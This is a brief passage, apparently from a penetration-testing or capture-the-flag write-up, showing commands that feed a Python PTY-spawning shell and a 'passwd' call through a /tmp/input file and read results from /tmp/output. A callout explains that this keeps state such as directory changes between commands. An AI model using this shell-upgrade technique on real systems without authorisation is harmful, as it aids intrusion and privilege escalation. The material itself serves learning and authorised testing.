...
echo "python -c \" import pty;pty.spawn('/bin/sh')\""> /tmp/input
echo "passwd" > /tmp/input
cat /tmp/output
```

> [!NOTE] Title
> This ensure presestance, so when we change directory like `cd /etc` this change will be preserved for the next command.
